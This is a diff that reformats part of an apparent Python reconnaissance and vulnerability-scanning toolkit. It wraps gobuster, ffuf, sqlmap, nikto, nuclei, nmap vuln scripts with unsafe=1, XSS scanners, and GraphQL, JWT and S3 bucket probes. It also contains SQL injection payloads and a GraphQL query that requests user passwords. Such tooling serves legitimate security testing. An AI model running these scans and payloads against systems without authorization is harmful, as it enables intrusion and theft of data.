-def run_gobuster(target: str, wordlist: Path, out_file: Path, extensions: str, env: Dict[str, str]):
+
+def run_gobuster(
+    target: str, wordlist: Path, out_file: Path, extensions: str, env: Dict[str, str]
+):
     if not which("gobuster"):
         logger.log("gobuster not found, skipping", "WARNING")
         return
     if not wordlist.exists():
         logger.log(f"Wordlist not found: {wordlist}", "WARNING")
         return
-    run_cmd([
-        "gobuster", "dir", "-u", target, "-w", str(wordlist),
-        "-x", extensions, "-o", str(out_file), "-q", "-k", "--no-error"
-    ], env=env, timeout=1800, check_return=False)
+    run_cmd(
+        [
+            "gobuster",
+            "dir",
+            "-u",
+            target,
+            "-w",
+            str(wordlist),
+            "-x",
+            extensions,
+            "-o",
+            str(out_file),
+            "-q",
+            "-k",
+            "--no-error",
+        ],
+        env=env,
+        timeout=1800,
+        check_return=False,
+    )
+
 
 def run_dirb(target: str, wordlist: Path, out_file: Path, env: Dict[str, str]):
     if not which("dirb"):
@@ -4150,7 +5234,13 @@ def run_dirb(target: str, wordlist: Path, out_file: Path, env: Dict[str, str]):
     if not wordlist.exists():
         logger.log(f"Wordlist not found: {wordlist}", "WARNING")
         return
-    run_cmd(["dirb", target, str(wordlist), "-o", str(out_file), "-w"], env=env, timeout=1800, check_return=False)
+    run_cmd(
+        ["dirb", target, str(wordlist), "-o", str(out_file), "-w"],
+        env=env,
+        timeout=1800,
+        check_return=False,
+    )
+
 
 def run_ffuf(target: str, wordlist: Path, out_file: Path, env: Dict[str, str]):
     if not which("ffu"):
@@ -4159,52 +5249,119 @@ def run_ffuf(target: str, wordlist: Path, out_file: Path, env: Dict[str, str]):
     if not wordlist.exists():
         logger.log(f"Wordlist not found: {wordlist}", "WARNING")
         return
-    target_fuzz = target.rstrip('/') + '/FUZZ'
-    run_cmd([
-        "ffu", "-u", target_fuzz, "-w", str(wordlist),
-        "-o", str(out_file), "-o", "json", "-mc", "200,201,202,204,301,302,303,307,308,401,403,405",
-        "-fs", "0", "-t", "50"
-    ], env=env, timeout=1800, check_return=False)
+    target_fuzz = target.rstrip("/") + "/FUZZ"
+    run_cmd(
+        [
+            "ffu",
+            "-u",
+            target_fuzz,
+            "-w",
+            str(wordlist),
+            "-o",
+            str(out_file),
+            "-o",
+            "json",
+            "-mc",
+            "200,201,202,204,301,302,303,307,308,401,403,405",
+            "-fs",
+            "0",
+            "-t",
+            "50",
+        ],
+        env=env,
+        timeout=1800,
+        check_return=False,
+    )
+
 
 def run_waybackurls(domain: str, out_file: Path, env: Dict[str, str]):
     if not which("waybackurls"):
         logger.log("waybackurls not found, skipping", "WARNING")
         return
-    run_cmd(["waybackurls", domain], capture=True, env=env, timeout=600, check_return=False)
+    run_cmd(
+        ["waybackurls", domain], capture=True, env=env, timeout=600, check_return=False
+    )
     # Redirect output manually
     try:
-        result = run_cmd(["waybackurls", domain], capture=True, env=env, timeout=600, check_return=False)
+        result = run_cmd(
+            ["waybackurls", domain],
+            capture=True,
+            env=env,
+            timeout=600,
+            check_return=False,
+        )
         if result.stdout:
             atomic_write(out_file, result.stdout)
     except Exception as e:
         logger.log(f"waybackurls error: {e}", "WARNING")
 
+
 def run_gospider(target: str, out_file: Path, depth: int, env: Dict[str, str]):
     if not which("gospider"):
         logger.log("gospider not found, skipping", "WARNING")
         return
-    run_cmd([
-        "gospider", "-s", target, "-d", str(depth),
-        "-o", str(out_file.parent), "--json", "-t", "10", "-k"
-    ], env=env, timeout=900, check_return=False)
+    run_cmd(
+        [
+            "gospider",
+            "-s",
+            target,
+            "-d",
+            str(depth),
+            "-o",
+            str(out_file.parent),
+            "--json",
+            "-t",
+            "10",
+            "-k",
+        ],
+        env=env,
+        timeout=900,
+        check_return=False,
+    )
+
 
 def run_whatweb(target: str, out_file: Path, env: Dict[str, str]):
     if not which("whatweb"):
         logger.log("whatweb not found, skipping", "WARNING")
         return
-    run_cmd([
-        "whatweb", target, "--log-json", str(out_file),
-        "-a", "3", "--max-threads", "10"
-    ], env=env, timeout=600, check_return=False)
+    run_cmd(
+        [
+            "whatweb",
+            target,
+            "--log-json",
+            str(out_file),
+            "-a",
+            "3",
+            "--max-threads",
+            "10",
+        ],
+        env=env,
+        timeout=600,
+        check_return=False,
+    )
+
 
 def run_nikto(target: str, out_file: Path, env: Dict[str, str]):
     if not which("nikto"):
         logger.log("nikto not found, skipping", "WARNING")
         return
-    run_cmd([
-        "nikto", "-h", target, "-output", str(out_file),
-        "-Format", "json", "-Timeout", "10"
-    ], env=env, timeout=1800, check_return=False)
+    run_cmd(
+        [
+            "nikto",
+            "-h",
+            target,
+            "-output",
+            str(out_file),
+            "-Format",
+            "json",
+            "-Timeout",
+            "10",
+        ],
+        env=env,
+        timeout=1800,
+        check_return=False,
+    )
+
 
 def run_subjack(subdomains_file: Path, out_file: Path, env: Dict[str, str]):
     if not which("subjack"):
@@ -4213,10 +5370,22 @@ def run_subjack(subdomains_file: Path, out_file: Path, env: Dict[str, str]):
     if not subdomains_file.exists():
         logger.log(f"Subdomains file not found: {subdomains_file}", "WARNING")
         return
-    run_cmd([
-        "subjack", "-w", str(subdomains_file), "-o", str(out_file),
-        "-c", "/opt/subjack/fingerprints.json", "-v"
-    ], env=env, timeout=600, check_return=False)
+    run_cmd(
+        [
+            "subjack",
+            "-w",
+            str(subdomains_file),
+            "-o",
+            str(out_file),
+            "-c",
+            "/opt/subjack/fingerprints.json",
+            "-v",
+        ],
+        env=env,
+        timeout=600,
+        check_return=False,
+    )
+
 
 def run_sqlmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
     if not which("sqlmap"):
@@ -4227,15 +5396,26 @@ def run_sqlmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, 
     sqlmap_cfg = cfg.get("sqlmap_testing", {})
 
     cmd = [
-        "sqlmap", "-u", target, "--batch",
-        "--crawl", str(sqlmap_cfg.get("crawl_depth", 1)),  # Reduced crawl depth
-        "--level", str(sqlmap_cfg.get("level", 2)),        # Reduced level
-        "--risk", str(sqlmap_cfg.get("risk", 2)),
-        "--output-dir", str(out_file.parent),
-        "--technique", sqlmap_cfg.get("techniques", "BEUST"),
-        "--threads", str(sqlmap_cfg.get("threads", 2)),    # Reduced threads
-        "--timeout", "30",                                 # Add timeout
-        "--retries", "1"                                   # Reduce retries
+        "sqlmap",
+        "-u",
+        target,
+        "--batch",
+        "--crawl",
+        str(sqlmap_cfg.get("crawl_depth", 1)),  # Reduced crawl depth
+        "--level",
+        str(sqlmap_cfg.get("level", 2)),  # Reduced level
+        "--risk",
+        str(sqlmap_cfg.get("risk", 2)),
+        "--output-dir",
+        str(out_file.parent),
+        "--technique",
+        sqlmap_cfg.get("techniques", "BEUST"),
+        "--threads",
+        str(sqlmap_cfg.get("threads", 2)),  # Reduced threads
+        "--timeout",
+        "30",  # Add timeout
+        "--retries",
+        "1",  # Reduce retries
     ]
 
     # Add tamper scripts if configured
@@ -4246,20 +5426,29 @@ def run_sqlmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, 
     # Reduced overall timeout to prevent hanging
     run_cmd(cmd, env=env, timeout=600, check_return=False)
 
-def run_additional_sql_tests(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def run_additional_sql_tests(
+    target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]
+):
     """Run additional SQL injection tests using custom payloads"""
     logger.log(f"Running additional SQL tests for {target}", "DEBUG")
 
     sql_results = {
         "target": target,
         "basic_tests": [],
-        "timestamp": datetime.now().isoformat()
+        "timestamp": datetime.now().isoformat(),
     }
 
     # Basic SQL error detection payloads
     test_payloads = [
-        "'", "''", "1'", "1' OR '1'='1", "admin'--",
-        "' OR 1=1--", "' UNION SELECT NULL--", "1; WAITFOR DELAY '00:00:05'--"
+        "'",
+        "''",
+        "1'",
+        "1' OR '1'='1",
+        "admin'--",
+        "' OR 1=1--",
+        "' UNION SELECT NULL--",
+        "1; WAITFOR DELAY '00:00:05'--",
     ]
 
     try:
@@ -4268,25 +5457,35 @@ def run_additional_sql_tests(target: str, out_file: Path, env: Dict[str, str], c
 
             try:
                 # Simple test with curl
-                result = run_cmd([
-                    "curl", "-s", "-m", "8", "-L", "--max-redirs", "3", test_url
-                ], capture=True, timeout=10, check_return=False)
+                result = run_cmd(
+                    ["curl", "-s", "-m", "8", "-L", "--max-redirs", "3", test_url],
+                    capture=True,
+                    timeout=10,
+                    check_return=False,
+                )
 
                 if result.stdout:
                     # Look for SQL error patterns
                     error_patterns = [
-                        "mysql_fetch", "ora-01", "microsoft ole db", "syntax error",
-                        "sqlstate", "postgresql", "warning: mysql"
+                        "mysql_fetch",
+                        "ora-01",
+                        "microsoft ole db",
+                        "syntax error",
+                        "sqlstate",
+                        "postgresql",
+                        "warning: mysql",
                     ]
 
                     response_text = result.stdout.lower()
                     for pattern in error_patterns:
                         if pattern in response_text:
-                            sql_results["basic_tests"].append({
-                                "payload": payload,
-                                "error_pattern": pattern,
-                                "potential_sqli": True
-                            })
+                            sql_results["basic_tests"].append(
+                                {
+                                    "payload": payload,
+                                    "error_pattern": pattern,
+                                    "potential_sqli": True,
+                                }
+                            )
                             break
             except Exception as e:
                 logger.log(f"Error testing SQL payload {payload}: {e}", "DEBUG")
@@ -4296,7 +5495,10 @@ def run_additional_sql_tests(target: str, out_file: Path, env: Dict[str, str], c
     except Exception as e:
         logger.log(f"Error in additional SQL tests: {e}", "WARNING")
 
-def run_xss_strike(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def run_xss_strike(
+    target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]
+):
     """Run XSStrike for XSS vulnerability testing"""
     # Check multiple possible command names for XSStrike
     xss_strike_cmd = None
@@ -4306,7 +5508,10 @@ def run_xss_strike(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[s
             break
 
     if not xss_strike_cmd:
-        logger.log("XSStrike not found (tried: xsstrike, xssstrike, XSStrike.py), skipping", "WARNING")
+        logger.log(
+            "XSStrike not found (tried: xsstrike, xssstrike, XSStrike.py), skipping",
+            "WARNING",
+        )
         return
 
     xss_cfg = cfg.get("xss_testing", {})
@@ -4320,10 +5525,13 @@ def run_xss_strike(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[s
         cmd.extend(["--crawl", "--level", "2"])
 
     # Output to file
-    result_file = out_file.parent / f"xsstrike_{target.replace('/', '_').replace(':', '_')}.json"
+    result_file = (
+        out_file.parent / f"xsstrike_{target.replace('/', '_').replace(':', '_')}.json"
+    )
     cmd.extend(["-o", str(result_file)])
 
     run_cmd(cmd, env=env, timeout=1200, check_return=False)
+
 
 def run_dalfox(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
     """Run Dalfox for XSS vulnerability testing"""
@@ -4334,10 +5542,15 @@ def run_dalfox(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, 
     xss_cfg = cfg.get("xss_testing", {})
 
     cmd = [
-        "dalfox", "url", target,
-        "--format", "json",
-        "--output", str(out_file),
-        "--timeout", "10"
+        "dalfox",
+        "url",
+        target,
+        "--format",
+        "json",
+        "--output",
+        str(out_file),
+        "--timeout",
+        "10",
     ]
 
     # Add crawling if enabled
@@ -4350,7 +5563,10 @@ def run_dalfox(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, 
 
     run_cmd(cmd, env=env, timeout=600, check_return=False)
 
-def run_subzy(targets_file: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def run_subzy(
+    targets_file: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]
+):
     """Run Subzy for subdomain takeover detection"""
     if not which("subzy"):
         logger.log("subzy not found, skipping", "WARNING")
@@ -4359,23 +5575,30 @@ def run_subzy(targets_file: Path, out_file: Path, env: Dict[str, str], cfg: Dict
     takeover_cfg = cfg.get("subdomain_takeover", {})
 
     cmd = [
-        "subzy", "run",
-        "--targets", str(targets_file),
-        "--concurrency", str(takeover_cfg.get("threads", 10)),
-        "--timeout", str(takeover_cfg.get("timeout", 30)),
-        "--verify_ssl"
+        "subzy",
+        "run",
+        "--targets",
+        str(targets_file),
+        "--concurrency",
+        str(takeover_cfg.get("threads", 10)),
+        "--timeout",
+        str(takeover_cfg.get("timeout", 30)),
+        "--verify_ssl",
     ]
 
     # Run and capture output
     try:
         result = run_cmd(cmd, env=env, timeout=600, capture=True, check_return=False)
         if result.stdout:
-            with open(out_file, 'w') as f:
+            with open(out_file, "w") as f:
                 f.write(result.stdout)
     except Exception as e:
         logger.log(f"Subzy execution error: {e}", "ERROR")
 
-def run_enhanced_nmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def run_enhanced_nmap(
+    target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]
+):
     """Run enhanced Nmap scanning with advanced options"""
     if not which("nmap"):
         logger.log("nmap not found, skipping", "WARNING")
@@ -4387,11 +5610,15 @@ def run_enhanced_nmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dic
     # Basic service detection
     if nmap_cfg.get("service_detection", True):
         cmd = [
-            "nmap", "-sS", "-sV",
-            "--top-ports", str(nmap_cfg.get("top_ports", 1000)),
+            "nmap",
+            "-sS",
+            "-sV",
+            "--top-ports",
+            str(nmap_cfg.get("top_ports", 1000)),
             "-T" + str(nmap_cfg.get("timing", 4)),
-            "-oA", str(out_file.parent / f"nmap_{hostname}"),
-            hostname
+            "-oA",
+            str(out_file.parent / f"nmap_{hostname}"),
+            hostname,
         ]
 
         if nmap_cfg.get("os_detection", True):
@@ -4405,14 +5632,25 @@ def run_enhanced_nmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dic
     # Vulnerability scripts
     if nmap_cfg.get("vulnerability_scripts", True):
         vuln_cmd = [
-            "nmap", "--script", "vuln",
-            "--script-args", "unsafe=1",
-            "-oA", str(out_file.parent / f"nmap_vuln_{hostname}"),
-            hostname
+            "nmap",
+            "--script",
+            "vuln",
+            "--script-args",
+            "unsafe=1",
+            "-oA",
+            str(out_file.parent / f"nmap_vuln_{hostname}"),
+            hostname,
         ]
         run_cmd(vuln_cmd, env=env, timeout=2400, check_return=False)
 
-def run_feroxbuster(target: str, wordlist: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+
+def run_feroxbuster(
+    target: str,
+    wordlist: Path,
+    out_file: Path,
+    env: Dict[str, str],
+    cfg: Dict[str, Any],
+):
     """Run feroxbuster for directory discovery"""
     if not which("feroxbuster"):
         logger.log("feroxbuster not found, skipping", "WARNING")
@@ -4425,12 +5663,17 @@ def run_feroxbuster(target: str, wordlist: Path, out_file: Path, env: Dict[str, 
 
     cmd = [
         "feroxbuster",
-        "-u", target,
-        "-w", str(wordlist),
-        "-o", str(out_file),
-        "-t", str(fuzzing_cfg.get("threads", 50)),
-        "-s", fuzzing_cfg.get("status_codes", "200,204,301,302,307,308,401,403,405,500"),
-        "--auto-tune"
+        "-u",
+        target,
+        "-w",
+        str(wordlist),
+        "-o",
+        str(out_file),
+        "-t",
+        str(fuzzing_cfg.get("threads", 50)),
+        "-s",
+        fuzzing_cfg.get("status_codes", "200,204,301,302,307,308,401,403,405,500"),
+        "--auto-tune",
     ]
 
     # Add extensions if configured
@@ -4444,7 +5687,10 @@ def run_feroxbuster(target: str, wordlist: Path, out_file: Path, env: Dict[str, 
 
     run_cmd(cmd, env=env, timeout=1800, check_return=False)
 
-def run_nuclei_single_target(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):
+
+def run_nuclei_single_target(
+    target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]
+):
     if not which("nuclei") or not cfg["nuclei"]["enabled"]:
         logger.log("nuclei not found or disabled, skipping", "WARNING")
         return
@@ -4452,11 +5698,20 @@ def run_nuclei_single_target(target: str, out_file: Path, cfg: Dict[str, Any], e
     nuclei_cfg = cfg["nuclei"]
 
     cmd = [
-        "nuclei", "-u", target, "-json", "-o", str(out_file),
-        "-severity", nuclei_cfg["severity"],
-        "-rl", str(nuclei_cfg["rps"]),
-        "-c", str(nuclei_cfg["conc"]),
-        "-silent", "-no-color"
+        "nuclei",
+        "-u",
+        target,
+        "-json",
+        "-o",
+        str(out_file),
+        "-severity",
+        nuclei_cfg["severity"],
+        "-rl",
+        str(nuclei_cfg["rps"]),
+        "-c",
+        str(nuclei_cfg["conc"]),
+        "-silent",
+        "-no-color",
     ]
 
     # Add community template sources
@@ -4492,6 +5747,7 @@ def run_nuclei_single_target(target: str, out_file: Path, cfg: Dict[str, Any], e
 
     run_cmd(cmd, env=env, timeout=3600, check_return=False)
 
+
 def run_dns_enumeration(domain: str, out_file: Path, env: Dict[str, str]):
     """Enhanced DNS enumeration with multiple record types"""
     dns_info = {
@@ -4499,40 +5755,52 @@ def run_dns_enumeration(domain: str, out_file: Path, env: Dict[str, str]):
         "records": {},
         "nameservers": [],
         "mx_records": [],
-        "txt_records": []
+        "txt_records": [],
     }
 
     record_types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA", "PTR"]
 
     for record_type in record_types:
         try:
-            result = run_cmd(["dig", "+short", record_type, domain], capture=True, timeout=30, check_return=False)
+            result = run_cmd(
+                ["dig", "+short", record_type, domain],
+                capture=True,
+                timeout=30,
+                check_return=False,
+            )
             if result.stdout and result.stdout.strip():
-                dns_info["records"][record_type] = result.stdout.strip().split('\n')
+                dns_info["records"][record_type] = result.stdout.strip().split("\n")
         except Exception as e:
             logger.log(f"DNS lookup error for {record_type} {domain}: {e}", "DEBUG")
 
     atomic_write(out_file, json.dumps(dns_info, indent=2))
+
 
 def run_ssl_analysis(target: str, out_file: Path, env: Dict[str, str]):
     """SSL/TLS certificate analysis"""
     if not target.startswith("https://"):
         target = f"https://{target}"
 
-    ssl_info = {
-        "target": target,
-        "certificate": {},
-        "ciphers": [],
-        "protocols": []
-    }
+    ssl_info = {"target": target, "certificate": {}, "ciphers": [], "protocols": []}
 
     try:
         # Use openssl to get certificate info
         hostname = target.replace("https://", "").split("/")[0]
-        result = run_cmd([
-            "openssl", "s_client", "-connect", f"{hostname}:443",
-            "-servername", hostname, "-showcerts"
-        ], capture=True, timeout=30, check_return=False, use_shell=False)
+        result = run_cmd(
+            [
+                "openssl",
+                "s_client",
+                "-connect",
+                f"{hostname}:443",
+                "-servername",
+                hostname,
+                "-showcerts",
+            ],
+            capture=True,
+            timeout=30,
+            check_return=False,
+            use_shell=False,
+        )
 
         if result.stdout:
             ssl_info["raw_output"] = result.stdout
@@ -4540,6 +5808,7 @@ def run_ssl_analysis(target: str, out_file: Path, env: Dict[str, str]):
         atomic_write(out_file, json.dumps(ssl_info, indent=2))
     except Exception as e:
         logger.log(f"SSL analysis error for {target}: {e}", "WARNING")
+
 
 def run_network_analysis(target: str, out_dir: Path, env: Dict[str, str]):
     """Comprehensive network analysis"""
@@ -4551,7 +5820,9 @@ def run_network_analysis(target: str, out_dir: Path, env: Dict[str, str]):
     # Whois lookup
     if which("whois"):
         try:
-            result = run_cmd(["whois", hostname], capture=True, timeout=60, check_return=False)
+            result = run_cmd(
+                ["whois", hostname], capture=True, timeout=60, check_return=False
+            )
             if result.stdout:
                 atomic_write(out_dir / "whois.txt", result.stdout)
         except Exception as e:
@@ -4560,7 +5831,12 @@ def run_network_analysis(target: str, out_dir: Path, env: Dict[str, str]):
     # Traceroute
     if which("traceroute"):
         try:
-            result = run_cmd(["traceroute", "-m", "15", hostname], capture=True, timeout=120, check_return=False)
+            result = run_cmd(
+                ["traceroute", "-m", "15", hostname],
+                capture=True,
+                timeout=120,
+                check_return=False,
+            )
             if result.stdout:
                 atomic_write(out_dir / "traceroute.txt", result.stdout)
         except Exception as e:
@@ -4568,18 +5844,27 @@ def run_network_analysis(target: str, out_dir: Path, env: Dict[str, str]):
 
     # ASN lookup using dig
     try:
-        result = run_cmd(["dig", "+short", hostname], capture=True, timeout=30, check_return=False)
+        result = run_cmd(
+            ["dig", "+short", hostname], capture=True, timeout=30, check_return=False
+        )
         if result.stdout:
-            ip = result.stdout.strip().split('\n')[0]
+            ip = result.stdout.strip().split("\n")[0]
             if ip:
                 # Reverse IP for ASN lookup
-                reversed_ip = '.'.join(ip.split('.')[::-1])
-                asn_result = run_cmd(["dig", "+short", f"{reversed_ip}.origin.asn.cymru.com", "TXT"],
-                                   capture=True, timeout=30, check_return=False)
+                reversed_ip = ".".join(ip.split(".")[::-1])
+                asn_result = run_cmd(
+                    ["dig", "+short", f"{reversed_ip}.origin.asn.cymru.com", "TXT"],
+                    capture=True,
+                    timeout=30,
+                    check_return=False,
+                )
                 if asn_result.stdout:
-                    atomic_write(out_dir / "asn_info.txt", f"IP: {ip}\nASN: {asn_result.stdout}")
+                    atomic_write(
+                        out_dir / "asn_info.txt", f"IP: {ip}\nASN: {asn_result.stdout}"
+                    )
     except Exception as e:
         logger.log(f"ASN lookup error for {hostname}: {e}", "WARNING")
+
 
 def run_api_discovery(target: str, out_file: Path, env: Dict[str, str]):
     """Enhanced API endpoint discovery and analysis"""
@@ -4589,25 +5874,48 @@ def run_api_discovery(target: str, out_file: Path, env: Dict[str, str]):
 
         # Common API endpoints
         api_endpoints = [
-            "/api", "/api/v1", "/api/v2", "/rest", "/graphql",
-            "/swagger", "/swagger.json", "/openapi.json", "/api-docs",
-            "/docs", "/documentation", "/spec", "/.well-known",
-            "/health", "/status", "/metrics", "/admin"
+            "/api",
+            "/api/v1",
+            "/api/v2",
+            "/rest",
+            "/graphql",
+            "/swagger",
+            "/swagger.json",
+            "/openapi.json",
+            "/api-docs",
+            "/docs",
+            "/documentation",
+            "/spec",
+            "/.well-known",
+            "/health",
+            "/status",
+            "/metrics",
+            "/admin",
         ]
 
         for endpoint in api_endpoints:
             try:
                 if which("curl"):
                     test_url = f"{target.rstrip('/')}{endpoint}"
-                    result = run_cmd(["curl", "-s", "-I", "-L", "--max-time", "10", test_url],
-                                   capture=True, timeout=15, check_return=False)
-                    if result.stdout and ("200" in result.stdout or "swagger" in result.stdout.lower() or "api" in result.stdout.lower()):
-                        results.append({
-                            "endpoint": endpoint,
-                            "url": test_url,
-                            "response_headers": result.stdout.strip(),
-                            "discovered": datetime.now().isoformat()
-                        })
+                    result = run_cmd(
+                        ["curl", "-s", "-I", "-L", "--max-time", "10", test_url],
+                        capture=True,
+                        timeout=15,
+                        check_return=False,
+                    )
+                    if result.stdout and (
+                        "200" in result.stdout
+                        or "swagger" in result.stdout.lower()
+                        or "api" in result.stdout.lower()
+                    ):
+                        results.append(
+                            {
+                                "endpoint": endpoint,
+                                "url": test_url,
+                                "response_headers": result.stdout.strip(),
+                                "discovered": datetime.now().isoformat(),
+                            }
+                        )
             except Exception:
                 continue
 
@@ -4618,13 +5926,20 @@ def run_api_discovery(target: str, out_file: Path, env: Dict[str, str]):
     except Exception as e:
         logger.log(f"API discovery error: {e}", "ERROR")
 
+
 def run_graphql_testing(target: str, out_file: Path, env: Dict[str, str]):
     """GraphQL security testing"""
     try:
         logger.log(f"GraphQL testing for {target}", "INFO")
         results = {}
 
-        graphql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/query"]
+        graphql_endpoints = [
+            "/graphql",
+            "/graphiql",
+            "/api/graphql",
+            "/v1/graphql",
+            "/query",
+        ]
 
         for endpoint in graphql_endpoints:
             try:
@@ -4633,52 +5948,82 @@ def run_graphql_testing(target: str, out_file: Path, env: Dict[str, str]):
 
                     # Test for introspection
                     introspection_query = {"query": "{ __schema { types { name } } }"}
-                    result = run_cmd([
-                        "curl", "-s", "-X", "POST",
-                        "-H", "Content-Type: application/json",
-                        "-d", json.dumps(introspection_query),
-                        "--max-time", "10", test_url
-                    ], capture=True, timeout=15, check_return=False)
+                    result = run_cmd(
+                        [
+                            "curl",
+                            "-s",
+                            "-X",
+                            "POST",
+                            "-H",
+                            "Content-Type: application/json",
+                            "-d",
+                            json.dumps(introspection_query),
+                            "--max-time",
+                            "10",
+                            test_url,
+                        ],
+                        capture=True,
+                        timeout=15,
+                        check_return=False,
+                    )
 
-                    if result.stdout and ("__schema" in result.stdout or "types" in result.stdout):
+                    if result.stdout and (
+                        "__schema" in result.stdout or "types" in result.stdout
+                    ):
                         results[endpoint] = {
                             "introspection_enabled": True,
                             "response": result.stdout.strip(),
-                            "url": test_url
+                            "url": test_url,
                         }
 
                     # Test for common GraphQL vulnerabilities
                     test_queries = [
                         '{ __type(name: "User") { fields { name type { name } } } }',
-                        'query { users { id email password } }'
+                        "query { users { id email password } }",
                     ]
 
                     for query in test_queries:
                         test_query = {"query": query}
-                        result = run_cmd([
-                            "curl", "-s", "-X", "POST",
-                            "-H", "Content-Type: application/json",
-                            "-d", json.dumps(test_query),
-                            "--max-time", "5", test_url
-                        ], capture=True, timeout=10, check_return=False)
+                        result = run_cmd(
+                            [
+                                "curl",
+                                "-s",
+                                "-X",
+                                "POST",
+                                "-H",
+                                "Content-Type: application/json",
+                                "-d",
+                                json.dumps(test_query),
+                                "--max-time",
+                                "5",
+                                test_url,
+                            ],
+                            capture=True,
+                            timeout=10,
+                            check_return=False,
+                        )
 
                         if result.stdout and "data" in result.stdout:
                             if endpoint not in results:
                                 results[endpoint] = {}
-                            results[endpoint]["vulnerable_queries"] = results[endpoint].get("vulnerable_queries", [])
-                            results[endpoint]["vulnerable_queries"].append({
-                                "query": query,
-                                "response": result.stdout.strip()
-                            })
+                            results[endpoint]["vulnerable_queries"] = results[
+                                endpoint
+                            ].get("vulnerable_queries", [])
+                            results[endpoint]["vulnerable_queries"].append(
+                                {"query": query, "response": result.stdout.strip()}
+                            )
 
             except Exception:
                 continue
 
         atomic_write(out_file, json.dumps(results, indent=2))
-        logger.log(f"GraphQL testing completed, found {len(results)} endpoints", "SUCCESS")
+        logger.log(
+            f"GraphQL testing completed, found {len(results)} endpoints", "SUCCESS"
+        )
 
     except Exception as e:
         logger.log(f"GraphQL testing error: {e}", "ERROR")
+
 
 def run_jwt_analysis(target: str, out_file: Path, env: Dict[str, str]):
     """JWT token analysis and security testing"""
@@ -4693,21 +6038,31 @@ def run_jwt_analysis(target: str, out_file: Path, env: Dict[str, str]):
             for endpoint in test_endpoints:
                 try:
                     test_url = f"{target.rstrip('/')}{endpoint}"
-                    result = run_cmd(["curl", "-s", "-I", "--max-time", "10", test_url],
-                                   capture=True, timeout=15, check_return=False)
+                    result = run_cmd(
+                        ["curl", "-s", "-I", "--max-time", "10", test_url],
+                        capture=True,
+                        timeout=15,
+                        check_return=False,
+                    )
 
-                    if result.stdout and ("bearer" in result.stdout.lower() or "jwt" in result.stdout.lower()):
+                    if result.stdout and (
+                        "bearer" in result.stdout.lower()
+                        or "jwt" in result.stdout.lower()
+                    ):
                         results[endpoint] = {
                             "jwt_detected": True,
                             "headers": result.stdout.strip(),
-                            "url": test_url
+                            "url": test_url,
                         }
 
                         # Test for common JWT vulnerabilities
                         jwt_tests = [
-                            {"name": "None Algorithm", "header": '{"alg": "none", "typ": "JWT"}'},
+                            {
+                                "name": "None Algorithm",
+                                "header": '{"alg": "none", "typ": "JWT"}',
+                            },
                             {"name": "Weak Secret", "test": "weak_secret_test"},
-                            {"name": "Key Confusion", "test": "key_confusion_test"}
+                            {"name": "Key Confusion", "test": "key_confusion_test"},
                         ]
 
                         results[endpoint]["vulnerability_tests"] = jwt_tests
@@ -4721,6 +6076,7 @@ def run_jwt_analysis(target: str, out_file: Path, env: Dict[str, str]):
     except Exception as e:
         logger.log(f"JWT analysis error: {e}", "ERROR")
 
+
 def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str]):
     """Scan for exposed cloud storage buckets and containers"""
     try:
@@ -4729,15 +6085,23 @@ def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str])
 
         # Extract domain for bucket name generation
         from urllib.parse import urlparse
-        parsed = urlparse(target if target.startswith('http') else f"http://{target}")
+
+        parsed = urlparse(target if target.startswith("http") else f"http://{target}")
         domain = parsed.netloc or target
-        base_name = domain.replace('.', '-').replace('_', '-')
+        base_name = domain.replace(".", "-").replace("_", "-")
 
         # Generate potential bucket names
         bucket_names = [
-            base_name, f"{base_name}-backup", f"{base_name}-data", f"{base_name}-files",
-            f"{base_name}-images", f"{base_name}-static", f"{base_name}-assets",
-            f"{base_name}-dev", f"{base_name}-prod", f"{base_name}-test"
+            base_name,
+            f"{base_name}-backup",
+            f"{base_name}-data",
+            f"{base_name}-files",
+            f"{base_name}-images",
+            f"{base_name}-static",
+            f"{base_name}-assets",
+            f"{base_name}-dev",
+            f"{base_name}-prod",
+            f"{base_name}-test",
         ]
 
         # AWS S3 buckets
@@ -4745,15 +6109,25 @@ def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str])
             try:
                 if which("curl"):
                     s3_url = f"https://{bucket}.s3.amazonaws.com/"
-                    result = run_cmd(["curl", "-s", "-I", "--max-time", "10", s3_url],
-                                   capture=True, timeout=15, check_return=False)
+                    result = run_cmd(
+                        ["curl", "-s", "-I", "--max-time", "10", s3_url],
+                        capture=True,
+                        timeout=15,
+                        check_return=False,
+                    )
 
-                    if result.stdout and ("200" in result.stdout or "403" in result.stdout):
+                    if result.stdout and (
+                        "200" in result.stdout or "403" in result.stdout
+                    ):
                         results[f"s3_{bucket}"] = {
                             "type": "AWS S3",
                             "url": s3_url,
-                            "status": "accessible" if "200" in result.stdout else "exists_but_protected",
-                            "headers": result.stdout.strip()
+                            "status": (
+                                "accessible"
+                                if "200" in result.stdout
+                                else "exists_but_protected"
+                            ),
+                            "headers": result.stdout.strip(),
                         }
             except Exception:
                 continue
@@ -4763,15 +6137,23 @@ def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str])
             try:
                 if which("curl"):
